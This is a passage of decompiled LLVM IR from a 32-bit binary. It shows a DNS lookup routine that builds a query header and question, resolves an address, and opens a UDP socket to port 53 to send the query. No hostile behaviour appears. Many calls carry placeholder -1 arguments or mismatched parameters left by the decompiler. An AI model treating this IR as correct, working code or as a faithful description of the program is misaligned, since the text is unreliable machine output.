  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052951 = call i32 @__pthread_return_void(i32 %v2_8052949, i32 134550911)
  store i32 %v3_8052951, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80603c8.278 to i8*), i8** %stack_var_-252, align 4
  %v2_805295d = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80603c8.278 to i32))
  %v0_8052962 = load i64, i64* @global_var_80603e0.279, align 8
  %v1_8052962 = trunc i64 %v0_8052962 to i32
  %v1_8052967 = ashr i32 %v1_8052962, 31
  %v6_8052968 = and i64 %v0_8052962, 4294967295
  %v8_8052968 = zext i32 %v1_8052967 to i64
  %v9_8052968 = mul nuw i64 %v8_8052968, 4294967296
  %v10_8052968 = or i64 %v9_8052968, %v6_8052968
  %v14_8052968 = srem i64 %v10_8052968, %tmp33
  %v15_8052968 = trunc i64 %v14_8052968 to i32
  %v0_805296f = load i16, i16* @global_var_805a124.280, align 4
  %v2_805297e = load i8*, i8** %stack_var_-252, align 4
  %v3_805297e = ptrtoint i8* %v2_805297e to i32
  store i32 %v3_805297e, i32* @eax, align 4
  store i32 134550911, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052983 = call i32 @__pthread_return_void(i32 %v2_8052949, i32 1)
  store i32 %v3_8052983, i32* %eax.global-to-local, align 4
  %v3_80529c7 = sext i16 %v0_805296f to i32
  %v5_8052b2a = inttoptr i32 %v15_8052968 to i8*
  %v1_8052f4887 = add i32 %v12_80528f1, 28
  %v2_8052f4888 = inttoptr i32 %v1_8052f4887 to i32*
  %v3_8052f4889 = load i32, i32* %v2_8052f4888, align 4
  %tmp119 = icmp ult i32 %v3_8052f4889, 3
  br i1 %tmp119, label %dec_label_pc_80529a8, label %dec_label_pc_8052f6d

dec_label_pc_80529a8:                             ; preds = %dec_label_pc_8052922, %dec_label_pc_8052f48.backedge
  %v0_80529af92 = phi i32 [ %v0_8052f48.pre, %dec_label_pc_8052f48.backedge ], [ %v12_80528f1, %dec_label_pc_8052922 ]
  %v1_80529a8 = add i32 %v0_80529af92, 20
  %v2_80529a8 = inttoptr i32 %v1_80529a8 to i32*
  %v3_80529a8 = load i32, i32* %v2_80529a8, align 4
  %v13_80529a8 = icmp eq i32 %v3_80529a8, -1
  br i1 %v13_80529a8, label %dec_label_pc_80529a8.dec_label_pc_80529be_crit_edge, label %dec_label_pc_80529af

dec_label_pc_80529a8.dec_label_pc_80529be_crit_edge: ; preds = %dec_label_pc_80529a8
  %v0_80529be.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529be

dec_label_pc_80529af:                             ; preds = %dec_label_pc_80529a8
  %v3_80529b2 = load i32, i32* %v2_80529a8, align 4
  %v5_80529b2 = add i32 %v0_80529af92, -16
  %v6_80529b2 = inttoptr i32 %v5_80529b2 to i32*
  store i32 %v3_80529b2, i32* %v6_80529b2, align 4
  %v1_80529b6 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80529b6, i32* %eax.global-to-local, align 4
  %v0_80529bb = load i32, i32* @esp, align 4
  %v1_80529bb = add i32 %v0_80529bb, 16
  br label %dec_label_pc_80529be

dec_label_pc_80529be:                             ; preds = %dec_label_pc_80529a8.dec_label_pc_80529be_crit_edge, %dec_label_pc_80529af
  %v1_80529be = phi i32 [ %v0_80529af92, %dec_label_pc_80529a8.dec_label_pc_80529be_crit_edge ], [ %v1_80529bb, %dec_label_pc_80529af ]
  %v0_80529be = phi i32 [ %v0_80529be.pre, %dec_label_pc_80529a8.dec_label_pc_80529be_crit_edge ], [ %v1_80529b6, %dec_label_pc_80529af ]
  %v2_80529be = add i32 %v1_80529be, -4
  %v3_80529be = inttoptr i32 %v2_80529be to i32*
  store i32 %v0_80529be, i32* %v3_80529be, align 4
  %v1_80529bf = add i32 %v1_80529be, -8
  %v2_80529bf = inttoptr i32 %v1_80529bf to i32*
  store i32 512, i32* %v2_80529bf, align 4
  %v1_80529c4 = add i32 %v1_80529be, -12
  %v2_80529c4 = inttoptr i32 %v1_80529c4 to i32*
  store i32 0, i32* %v2_80529c4, align 4
  %v2_80529c6 = add i32 %v1_80529be, -16
  %v3_80529c6 = inttoptr i32 %v2_80529c6 to i32*
  store i32 %v2_80528da, i32* %v3_80529c6, align 4
  %v5_80529c7 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v5_80529c7, i32* %eax.global-to-local, align 4
  %v0_80529cc = load i32, i32* @esp, align 4
  %v1_80529cf = add i32 %v0_80529cc, 8
  %v2_80529cf = inttoptr i32 %v1_80529cf to i32*
  store i32 48, i32* %v2_80529cf, align 4
  %v1_80529d1 = add i32 %v0_80529cc, 4
  %v2_80529d1 = inttoptr i32 %v1_80529d1 to i32*
  store i32 0, i32* %v2_80529d1, align 4
  %v1_80529d3 = add i32 %v0_80529cc, 84
  store i32 %v1_80529d3, i32* @ebx, align 4
  %v3_80529d7 = inttoptr i32 %v0_80529cc to i32*
  store i32 %v1_80529d3, i32* %v3_80529d7, align 4
  %v5_80529d8 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v5_80529d8, i32* %eax.global-to-local, align 4
  %v0_80529dd = load i32, i32* @esp, align 4
  %v1_80529dd = add i32 %v0_80529dd, 60
  %v2_80529dd = inttoptr i32 %v1_80529dd to i32*
  %v3_80529dd = load i32, i32* %v2_80529dd, align 4
  store i32 %v3_80529dd, i32* %eax.global-to-local, align 4
  %v1_80529e1 = add i32 %v0_80529dd, 116
  %v2_80529e1 = inttoptr i32 %v1_80529e1 to i32*
  store i32 1, i32* %v2_80529e1, align 4
  %v0_80529e9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80529e9 = add i32 %v0_80529e9, 1
  %v0_80529ea = load i32, i32* @esp, align 4
  %v1_80529ea = add i32 %v0_80529ea, 104
  %v2_80529ea = inttoptr i32 %v1_80529ea to i32*
  store i32 1, i32* %v2_80529ea, align 4
  %v1_80529f2 = urem i32 %v1_80529e9, 65536
  store i32 %v1_80529f2, i32* %eax.global-to-local, align 4
  %v1_80529f7 = load i32, i32* @esp, align 4
  %v2_80529f7 = add i32 %v1_80529f7, 60
  %v3_80529f7 = inttoptr i32 %v2_80529f7 to i32*
  store i32 %v1_80529f2, i32* %v3_80529f7, align 4
  %v0_80529fb = load i32, i32* %eax.global-to-local, align 4
  %v1_80529fb = load i32, i32* @esp, align 4
  %v2_80529fb = add i32 %v1_80529fb, 84
  %v3_80529fb = inttoptr i32 %v2_80529fb to i32*
  store i32 %v0_80529fb, i32* %v3_80529fb, align 4
  %v0_80529ff = load i32, i32* @esp, align 4
  %v1_8052a02 = add i32 %v0_80529ff, 8
  %v2_8052a02 = inttoptr i32 %v1_8052a02 to i32*
  store i32 512, i32* %v2_8052a02, align 4
  %v2_8052a07 = add i32 %v0_80529ff, 4
  %v3_8052a07 = inttoptr i32 %v2_8052a07 to i32*
  store i32 %v2_80528da, i32* %v3_8052a07, align 4
  %v0_8052a08 = load i32, i32* @ebx, align 4
  %v3_8052a08 = inttoptr i32 %v0_80529ff to i32*
  store i32 %v0_8052a08, i32* %v3_8052a08, align 4
  %v0_8052a09 = call i32 @__encode_header()
  store i32 %v0_8052a09, i32* %eax.global-to-local, align 4
  %v0_8052a0e = load i32, i32* @esp, align 4
  store i32 %v0_8052a09, i32* @ebx, align 4
  %v2_8052a13 = icmp slt i32 %v0_8052a09, 0
  br i1 %v2_8052a13, label %dec_label_pc_8052f6d, label %dec_label_pc_8052a1b

dec_label_pc_8052a1b:                             ; preds = %dec_label_pc_80529be
  %v2_8052a1b = add i32 %v0_8052a0e, 12
  %v3_8052a1b = inttoptr i32 %v2_8052a1b to i32*
  store i32 %v0_8052a09, i32* %v3_8052a1b, align 4
  %v1_8052a1c = add i32 %v0_8052a0e, 8
  %v2_8052a1c = inttoptr i32 %v1_8052a1c to i32*
  store i32 1025, i32* %v2_8052a1c, align 4
  %v1_8052a21 = add i32 %v0_8052a0e, 256
  %v2_8052a21 = inttoptr i32 %v1_8052a21 to i32*
  %v3_8052a21 = load i32, i32* %v2_8052a21, align 4
  %v5_8052a21 = add i32 %v0_8052a0e, 4
  %v6_8052a21 = inttoptr i32 %v5_8052a21 to i32*
  store i32 %v3_8052a21, i32* %v6_8052a21, align 4
  %v1_8052a28 = add i32 %v0_8052a0e, 28
  %v2_8052a28 = inttoptr i32 %v1_8052a28 to i32*
  %v3_8052a28 = load i32, i32* %v2_8052a28, align 4
  %v6_8052a28 = inttoptr i32 %v0_8052a0e to i32*
  store i32 %v3_8052a28, i32* %v6_8052a28, align 4
  %v5_8052a2c = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052968, i32 %v3_80529c7)
  %v0_8052a31 = load i32, i32* @esp, align 4
  %v1_8052a34 = add i32 %v0_8052a31, 8
  %v2_8052a34 = inttoptr i32 %v1_8052a34 to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v2_8052a34, align 4
  %v1_8052a39 = add i32 %v0_8052a31, 4
  %v2_8052a39 = inttoptr i32 %v1_8052a39 to i32*
  store i32 134550911, i32* %v2_8052a39, align 4
  %v1_8052a3e = add i32 %v0_8052a31, 200
  store i32 %v1_8052a3e, i32* @eax, align 4
  %v3_8052a45 = inttoptr i32 %v0_8052a31 to i32*
  store i32 %v1_8052a3e, i32* %v3_8052a45, align 4
  %v2_8052a46 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052a46, i32* %eax.global-to-local, align 4
  %v0_8052a4b = load i32, i32* @esp, align 4
  %v1_8052a4b = inttoptr i32 %v0_8052a4b to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v1_8052a4b, align 4
  %v1_8052a52 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052a52, i32* %eax.global-to-local, align 4
  %v0_8052a57 = load i32, i32* @esp, align 4
  %v1_8052a57 = add i32 %v0_8052a57, 56
  %v2_8052a57 = inttoptr i32 %v1_8052a57 to i32*
  %v3_8052a57 = load i32, i32* %v2_8052a57, align 4
  store i32 %v3_8052a57, i32* %edx.global-to-local, align 4
  %v1_8052a5b = add i32 %v0_8052a57, 268
  %v2_8052a5b = inttoptr i32 %v1_8052a5b to i32*
  %v3_8052a5b = load i32, i32* %v2_8052a5b, align 4
  store i32 %v3_8052a5b, i32* %eax.global-to-local, align 4
  %v2_8052a62 = mul i32 %v3_8052a57, 4
  %v3_8052a62 = add i32 %v3_8052a5b, %v2_8052a62
  %v4_8052a62 = inttoptr i32 %v3_8052a62 to i32*
  %v5_8052a62 = load i32, i32* %v4_8052a62, align 4
  store i32 %v5_8052a62, i32* %edx.global-to-local, align 4
  %v2_8052a65 = add i32 %v0_8052a57, 48
  %v3_8052a65 = inttoptr i32 %v2_8052a65 to i32*
  store i32 %v5_8052a62, i32* %v3_8052a65, align 4
  %v0_8052a69 = load i32, i32* @esp, align 4
  %v1_8052a69 = add i32 %v0_8052a69, 16
  %v1_8052a6c = add i32 %v0_8052a69, 52
  %v2_8052a6c = inttoptr i32 %v1_8052a6c to i32*
  %v3_8052a6c = load i32, i32* %v2_8052a6c, align 4
  %v5_8052a6c = icmp slt i32 %v3_8052a6c, 0
  br i1 %v5_8052a6c, label %dec_label_pc_8052a1b.dec_label_pc_8052ab2_crit_edge, label %dec_label_pc_8052a73

dec_label_pc_8052a1b.dec_label_pc_8052ab2_crit_edge: ; preds = %dec_label_pc_8052a1b
  %v0_8052ab2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ab2

dec_label_pc_8052a73:                             ; preds = %dec_label_pc_8052a1b
  store i32 %v3_8052a6c, i32* %eax.global-to-local, align 4
  %v1_8052a77 = load i32, i32* @global_var_8060818.281, align 8
  %v2_8052a77 = sub i32 %v3_8052a6c, %v1_8052a77
  %v8_8052a77 = xor i32 %v1_8052a77, %v3_8052a6c
  %v9_8052a77 = xor i32 %v2_8052a77, %v3_8052a6c
  %v10_8052a77 = and i32 %v9_8052a77, %v8_8052a77
  %v11_8052a77 = icmp slt i32 %v10_8052a77, 0
  %v13_8052a77 = icmp slt i32 %v2_8052a77, 0
  %v2_8052a7d = icmp eq i1 %v13_8052a77, %v11_8052a77
  br i1 %v2_8052a7d, label %dec_label_pc_8052ab2, label %dec_label_pc_8052a7f

dec_label_pc_8052a7f:                             ; preds = %dec_label_pc_8052a73
  %v2_8052a7f = add i32 %v0_8052a69, 12
  %v3_8052a7f = inttoptr i32 %v2_8052a7f to i32*
  store i32 %v3_8052a6c, i32* %v3_8052a7f, align 4
  %v1_8052a80 = add i32 %v0_8052a69, 8
  %v2_8052a80 = inttoptr i32 %v1_8052a80 to i32*
  store i32 1025, i32* %v2_8052a80, align 4
  %v1_8052a85 = add i32 %v0_8052a69, 4
  %v2_8052a85 = inttoptr i32 %v1_8052a85 to i32*
  store i32 ptrtoint (i32* @global_var_805805c.282 to i32), i32* %v2_8052a85, align 4
  %v1_8052a8a = add i32 %v0_8052a69, 28
  %v2_8052a8a = inttoptr i32 %v1_8052a8a to i32*
  %v3_8052a8a = load i32, i32* %v2_8052a8a, align 4
  %v6_8052a8a = inttoptr i32 %v0_8052a69 to i32*
  store i32 %v3_8052a8a, i32* %v6_8052a8a, align 4
  %v0_8052a8e = call i32 @__GI_strncat()
  store i32 %v0_8052a8e, i32* %eax.global-to-local, align 4
  %v0_8052a93 = load i32, i32* @esp, align 4
  %v1_8052a96 = add i32 %v0_8052a93, 8
  %v2_8052a96 = inttoptr i32 %v1_8052a96 to i32*
  store i32 1025, i32* %v2_8052a96, align 4
  %v1_8052a9b = add i32 %v0_8052a93, 52
  %v2_8052a9b = inttoptr i32 %v1_8052a9b to i32*
  %v3_8052a9b = load i32, i32* %v2_8052a9b, align 4
  store i32 %v3_8052a9b, i32* %edx.global-to-local, align 4
  %v1_8052a9f = mul i32 %v3_8052a9b, 4
  %v2_8052a9f = add i32 %v1_8052a9f, 134612984
  %v3_8052a9f = inttoptr i32 %v2_8052a9f to i32*
  %v4_8052a9f = load i32, i32* %v3_8052a9f, align 4
  %v6_8052a9f = add i32 %v0_8052a93, 4
  %v7_8052a9f = inttoptr i32 %v6_8052a9f to i32*
  store i32 %v4_8052a9f, i32* %v7_8052a9f, align 4
  %v1_8052aa6 = add i32 %v0_8052a93, 28
  %v2_8052aa6 = inttoptr i32 %v1_8052aa6 to i32*
  %v3_8052aa6 = load i32, i32* %v2_8052aa6, align 4
  %v6_8052aa6 = inttoptr i32 %v0_8052a93 to i32*
  store i32 %v3_8052aa6, i32* %v6_8052aa6, align 4
  %v0_8052aaa = call i32 @__GI_strncat()
  store i32 %v0_8052aaa, i32* %eax.global-to-local, align 4
  %v0_8052aaf = load i32, i32* @esp, align 4
  %v1_8052aaf = add i32 %v0_8052aaf, 16
  br label %dec_label_pc_8052ab2

dec_label_pc_8052ab2:                             ; preds = %dec_label_pc_8052a1b.dec_label_pc_8052ab2_crit_edge, %dec_label_pc_8052a73, %dec_label_pc_8052a7f
  %v1_8052ab2 = phi i32 [ %v1_8052a69, %dec_label_pc_8052a1b.dec_label_pc_8052ab2_crit_edge ], [ %v1_8052a69, %dec_label_pc_8052a73 ], [ %v1_8052aaf, %dec_label_pc_8052a7f ]
  %v0_8052ab2 = phi i32 [ %v0_8052ab2.pre, %dec_label_pc_8052a1b.dec_label_pc_8052ab2_crit_edge ], [ %v3_8052a6c, %dec_label_pc_8052a73 ], [ %v0_8052aaa, %dec_label_pc_8052a7f ]
  %v2_8052ab2 = add i32 %v1_8052ab2, -4
  %v3_8052ab2 = inttoptr i32 %v2_8052ab2 to i32*
  store i32 %v0_8052ab2, i32* %v3_8052ab2, align 4
  %v0_8052ab3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ab3 = add i32 %v1_8052ab2, -8
  %v3_8052ab3 = inttoptr i32 %v2_8052ab3 to i32*
  store i32 %v0_8052ab3, i32* %v3_8052ab3, align 4
  %v1_8052ab4 = add i32 %v1_8052ab2, -12
  %v2_8052ab4 = inttoptr i32 %v1_8052ab4 to i32*
  store i32 1, i32* %v2_8052ab4, align 4
  %v1_8052ab6 = add i32 %v1_8052ab2, 184
  store i32 %v1_8052ab6, i32* @eax, align 4
  %v2_8052abd = add i32 %v1_8052ab2, -16
  %v3_8052abd = inttoptr i32 %v2_8052abd to i32*
  store i32 %v1_8052ab6, i32* %v3_8052abd, align 4
  %v2_8052abe = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052abe, i32* %eax.global-to-local, align 4
  %v0_8052ac3 = load i32, i32* @esp, align 4
  %v1_8052ac3 = add i32 %v0_8052ac3, 28
  %v2_8052ac3 = inttoptr i32 %v1_8052ac3 to i32*
  %v3_8052ac3 = load i32, i32* %v2_8052ac3, align 4
  store i32 %v3_8052ac3, i32* %eax.global-to-local, align 4
  %v1_8052ac7 = add i32 %v0_8052ac3, 260
  %v2_8052ac7 = inttoptr i32 %v1_8052ac7 to i32*
  %v3_8052ac7 = load i32, i32* %v2_8052ac7, align 4
  store i32 %v3_8052ac7, i32* @edx, align 4
  %v2_8052ace = add i32 %v0_8052ac3, 216
  %v3_8052ace = inttoptr i32 %v2_8052ace to i32*
  store i32 %v3_8052ac3, i32* %v3_8052ace, align 4
  %v0_8052ad5 = load i32, i32* @edx, align 4
  %v1_8052ad5 = load i32, i32* @esp, align 4
  %v2_8052ad5 = add i32 %v1_8052ad5, 220
  %v3_8052ad5 = inttoptr i32 %v2_8052ad5 to i32*
  store i32 %v0_8052ad5, i32* %v3_8052ad5, align 4
  %v0_8052adc = load i32, i32* @esp, align 4
  %v1_8052adc = add i32 %v0_8052adc, 224
  %v2_8052adc = inttoptr i32 %v1_8052adc to i32*
  store i32 1, i32* %v2_8052adc, align 4
  %v0_8052aec = load i32, i32* @esp, align 4
  %v1_8052aef = load i32, i32* @ebx, align 4
  %v2_8052aef = sub i32 512, %v1_8052aef
  %v2_8052af1 = add i32 %v0_8052aec, 8
  %v3_8052af1 = inttoptr i32 %v2_8052af1 to i32*
  store i32 %v2_8052aef, i32* %v3_8052af1, align 4
  %v1_8052af2 = load i32, i32* @ebx, align 4
  %v2_8052af2 = add i32 %v1_8052af2, %v2_80528da
  %v2_8052af6 = add i32 %v0_8052aec, 4
  %v3_8052af6 = inttoptr i32 %v2_8052af6 to i32*
  store i32 %v2_8052af2, i32* %v3_8052af6, align 4
  %v1_8052af7 = add i32 %v0_8052aec, 216
  store i32 %v1_8052af7, i32* @eax, align 4
  %v3_8052afe = inttoptr i32 %v0_8052aec to i32*
  store i32 %v1_8052af7, i32* %v3_8052afe, align 4
  %v0_8052aff = call i32 @__encode_question()
  store i32 %v0_8052aff, i32* %eax.global-to-local, align 4
  %v0_8052b04 = load i32, i32* @esp, align 4
  store i32 %v0_8052aff, i32* @esi, align 4
  %v2_8052b09 = icmp slt i32 %v0_8052aff, 0
  br i1 %v2_8052b09, label %dec_label_pc_8052f6d, label %dec_label_pc_8052b11

dec_label_pc_8052b11:                             ; preds = %dec_label_pc_8052ab2
  %v1_8052b11 = add i32 %v0_8052b04, 172
  %v2_8052b11 = inttoptr i32 %v1_8052b11 to i16*
  store i16 2, i16* %v2_8052b11, align 2
  %v1_8052b1b = load i32, i32* @esp, align 4
  %v2_8052b1b = add i32 %v1_8052b1b, -4
  %v3_8052b1b = inttoptr i32 %v2_8052b1b to i32*
  store i32 %v0_8052aff, i32* %v3_8052b1b, align 4
  %v1_8052b1c = add i32 %v1_8052b1b, 164
  store i32 %v1_8052b1c, i32* %eax.global-to-local, align 4
  %v2_8052b23 = add i32 %v1_8052b1b, -8
  %v3_8052b23 = inttoptr i32 %v2_8052b23 to i32*
  store i32 %v1_8052b1c, i32* %v3_8052b23, align 4
  %v1_8052b24 = add i32 %v1_8052b1b, 32
  %v2_8052b24 = inttoptr i32 %v1_8052b24 to i32*
  %v3_8052b24 = load i32, i32* %v2_8052b24, align 4
  %v5_8052b24 = add i32 %v1_8052b1b, -12
  %v6_8052b24 = inttoptr i32 %v5_8052b24 to i32*
  store i32 %v3_8052b24, i32* %v6_8052b24, align 4
  %v1_8052b28 = add i32 %v1_8052b1b, -16
  %v2_8052b28 = inttoptr i32 %v1_8052b28 to i32*
  store i32 10, i32* %v2_8052b28, align 4
  %v6_8052b2a = call i32 @inet_pton(i32 -1, i8* %v5_8052b2a, i32 %v3_80529c7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8052b2a, i32* %eax.global-to-local, align 4
  %v0_8052b2f = load i32, i32* @esp, align 4
  %v1_8052b2f = add i32 %v0_8052b2f, 16
  %tmp47 = icmp slt i32 %v6_8052b2a, 1
  br i1 %tmp47, label %dec_label_pc_8052b40, label %dec_label_pc_8052b36

dec_label_pc_8052b36:                             ; preds = %dec_label_pc_8052b11
  %v1_8052b36 = add i32 %v0_8052b2f, 172
  %v2_8052b36 = inttoptr i32 %v1_8052b36 to i16*
  store i16 10, i16* %v2_8052b36, align 2
  %v0_8052b40.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052b40

dec_label_pc_8052b40:                             ; preds = %dec_label_pc_8052b11, %dec_label_pc_8052b36
  %v0_8052b57 = phi i32 [ %v1_8052b2f, %dec_label_pc_8052b11 ], [ %v0_8052b40.pre, %dec_label_pc_8052b36 ]
  %v1_8052b40 = add i32 %v0_8052b57, 156
  %v2_8052b40 = inttoptr i32 %v1_8052b40 to i16*
  %v3_8052b40 = load i16, i16* %v2_8052b40, align 2
  %v12_8052b40 = icmp eq i16 %v3_8052b40, 10
  %v1_8052b49 = icmp eq i1 %v12_8052b40, false
  %v1_8052b57 = add i32 %v0_8052b57, 158
  %v2_8052b57 = inttoptr i32 %v1_8052b57 to i16*
  store i16 13568, i16* %v2_8052b57, align 2
  %v0_8052b61 = load i32, i32* @esp, align 4
  br i1 %v1_8052b49, label %dec_label_pc_8052b57, label %dec_label_pc_8052b77

dec_label_pc_8052b57:                             ; preds = %dec_label_pc_8052b40
  %v1_8052b64 = add i32 %v0_8052b61, 32
  %v2_8052b64 = inttoptr i32 %v1_8052b64 to i32*
  %v3_8052b64 = load i32, i32* %v2_8052b64, align 4
  %v5_8052b64 = add i32 %v0_8052b61, -16
  %v6_8052b64 = inttoptr i32 %v5_8052b64 to i32*
  store i32 %v3_8052b64, i32* %v6_8052b64, align 4
  %v1_8052b68 = call i32 @inet_addr(i32 -1)
  store i32 %v1_8052b68, i32* %eax.global-to-local, align 4
  %v1_8052b6d = load i32, i32* @esp, align 4
  %v2_8052b6d = add i32 %v1_8052b6d, 176
  %v3_8052b6d = inttoptr i32 %v2_8052b6d to i32*
  store i32 %v1_8052b68, i32* %v3_8052b6d, align 4
  %v0_8052b74 = load i32, i32* @esp, align 4
  %v1_8052b74 = add i32 %v0_8052b74, 16
  br label %dec_label_pc_8052b77

dec_label_pc_8052b77:                             ; preds = %dec_label_pc_8052b40, %dec_label_pc_8052b57
  %v1_8052b77 = phi i32 [ %v1_8052b74, %dec_label_pc_8052b57 ], [ %v0_8052b61, %dec_label_pc_8052b40 ]
  %v0_8052b77 = load i32, i32* @ecx, align 4
  %v2_8052b77 = add i32 %v1_8052b77, -4
  %v3_8052b77 = inttoptr i32 %v2_8052b77 to i32*
  store i32 %v0_8052b77, i32* %v3_8052b77, align 4
  %v1_8052b78 = add i32 %v1_8052b77, -8
  %v2_8052b78 = inttoptr i32 %v1_8052b78 to i32*
  store i32 17, i32* %v2_8052b78, align 4
  %v1_8052b7a = add i32 %v1_8052b77, -12
  %v2_8052b7a = inttoptr i32 %v1_8052b7a to i32*
  store i32 2, i32* %v2_8052b7a, align 4
  %v1_8052b7c = add i32 %v1_8052b77, 156
  %v2_8052b7c = inttoptr i32 %v1_8052b7c to i16*
  %v3_8052b7c = load i16, i16* %v2_8052b7c, align 2
  %v4_8052b7c = zext i16 %v3_8052b7c to i32
  store i32 %v4_8052b7c, i32* %eax.global-to-local, align 4
  %v2_8052b84 = add i32 %v1_8052b77, -16
  %v3_8052b84 = inttoptr i32 %v2_8052b84 to i32*
  store i32 %v4_8052b7c, i32* %v3_8052b84, align 4
  %v4_8052b85 = call i32 @socket(i32 -1, i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v4_8052b85, i32* %eax.global-to-local, align 4
  %v1_8052b8a = load i32, i32* @esp, align 4
  %v2_8052b8a = add i32 %v1_8052b8a, 36
  %v3_8052b8a = inttoptr i32 %v2_8052b8a to i32*
  store i32 %v4_8052b85, i32* %v3_8052b8a, align 4
  %v0_8052b8e = load i32, i32* @esp, align 4
  %v1_8052b8e = add i32 %v0_8052b8e, 16
  %v0_8052b91 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b91 = icmp slt i32 %v0_8052b91, 0
  br i1 %v2_8052b91, label %dec_label_pc_8052bbe, label %dec_label_pc_8052b95

dec_label_pc_8052b95:                             ; preds = %dec_label_pc_8052b77
  %v1_8052b95 = add i32 %v0_8052b8e, 172
  store i32 %v1_8052b95, i32* %eax.global-to-local, align 4
  %v0_8052b9c = load i32, i32* @edx, align 4
  %v2_8052b9c = add i32 %v0_8052b8e, 12
  %v3_8052b9c = inttoptr i32 %v2_8052b9c to i32*
  store i32 %v0_8052b9c, i32* %v3_8052b9c, align 4
  %v1_8052b9d = add i32 %v0_8052b8e, 8
  %v2_8052b9d = inttoptr i32 %v1_8052b9d to i32*
  store i32 28, i32* %v2_8052b9d, align 4
  %v0_8052b9f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b9f = add i32 %v0_8052b8e, 4
  %v3_8052b9f = inttoptr i32 %v2_8052b9f to i32*
  store i32 %v0_8052b9f, i32* %v3_8052b9f, align 4
  %v1_8052ba0 = add i32 %v0_8052b8e, 36
  %v2_8052ba0 = inttoptr i32 %v1_8052ba0 to i32*
  %v3_8052ba0 = load i32, i32* %v2_8052ba0, align 4
  %v6_8052ba0 = inttoptr i32 %v0_8052b8e to i32*
  store i32 %v3_8052ba0, i32* %v6_8052ba0, align 4
  %v4_8052ba4 = call i32 @__libc_connect(i32 -1, i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v4_8052ba4, i32* %eax.global-to-local, align 4
  %v0_8052ba9 = load i32, i32* @esp, align 4
  %v2_8052bac = icmp slt i32 %v4_8052ba4, 0
  %v1_8052bae = icmp eq i1 %v2_8052bac, false
  br i1 %v1_8052bae, label %dec_label_pc_8052bc7, label %dec_label_pc_8052bb0

dec_label_pc_8052bb0:                             ; preds = %dec_label_pc_8052b95
  %v1_8052bb0 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8052bb0, i32* %eax.global-to-local, align 4
  %v1_8052bb5 = inttoptr i32 %v1_8052bb0 to i32*
  %v2_8052bb5 = load i32, i32* %v1_8052bb5, align 4
  %v11_8052bb5 = icmp eq i32 %v2_8052bb5, 101
  %v0_8052f27.pre = load i32, i32* @esp, align 4
  br i1 %v11_8052bb5, label %dec_label_pc_8052f27, label %dec_label_pc_8052bbe

dec_label_pc_8052bbe:                             ; preds = %dec_label_pc_8052bb0, %dec_label_pc_8052b77
  %v17_8052bbe = phi i32 [ %v1_8052b8e, %dec_label_pc_8052b77 ], [ %v0_8052f27.pre, %dec_label_pc_8052bb0 ]
  %v1_8052bbe = add i32 %v17_8052bbe, 28
  %v2_8052bbe = inttoptr i32 %v1_8052bbe to i32*
  %v3_8052bbe = load i32, i32* %v2_8052bbe, align 4
  %v4_8052bbe = add i32 %v3_8052bbe, 1
  store i32 %v4_8052bbe, i32* %v2_8052bbe, align 4
  br label %dec_label_pc_8052f48.backedge

dec_label_pc_8052bc7:                             ; preds = %dec_label_pc_8052b95
  %v0_8052bc7 = load i32, i32* @ebx, align 4
  %v1_8052bc7 = load i32, i32* @esi, align 4
  %v2_8052bc7 = add i32 %v1_8052bc7, %v0_8052bc7
  store i32 %v2_8052bc7, i32* %eax.global-to-local, align 4
  %v1_8052bca = add i32 %v0_8052ba9, 12
  %v2_8052bca = inttoptr i32 %v1_8052bca to i32*
  store i32 0, i32* %v2_8052bca, align 4
  %v0_8052bcc = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bcc = add i32 %v0_8052ba9, 8
  %v3_8052bcc = inttoptr i32 %v2_8052bcc to i32*
  store i32 %v0_8052bcc, i32* %v3_8052bcc, align 4
  %v2_8052bcd = add i32 %v0_8052ba9, 4
  %v3_8052bcd = inttoptr i32 %v2_8052bcd to i32*
  store i32 %v2_80528da, i32* %v3_8052bcd, align 4
  %v1_8052bce = add i32 %v0_8052ba9, 36
  %v2_8052bce = inttoptr i32 %v1_8052bce to i32*
  %v3_8052bce = load i32, i32* %v2_8052bce, align 4
  %v6_8052bce = inttoptr i32 %v0_8052ba9 to i32*
  store i32 %v3_8052bce, i32* %v6_8052bce, align 4
  %v5_8052bd2 = call i32 @__libc_send(i32 -1, i32 %v15_8052968, i32 %v3_80529c7, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8052bd2, i32* %eax.global-to-local, align 4
  %v0_8052bd7 = load i32, i32* @esp, align 4
  %v1_8052bd7 = add i32 %v0_8052bd7, 36
  %v2_8052bd7 = inttoptr i32 %v1_8052bd7 to i32*
  %v3_8052bd7 = load i32, i32* %v2_8052bd7, align 4
  %v2_8052bdb = add i32 %v0_8052bd7, 228
  %v3_8052bdb = inttoptr i32 %v2_8052bdb to i32*
  store i32 %v3_8052bd7, i32* %v3_8052bdb, align 4
  %v0_8052be2 = load i32, i32* @esp, align 4
  %v1_8052be2 = add i32 %v0_8052be2, 232
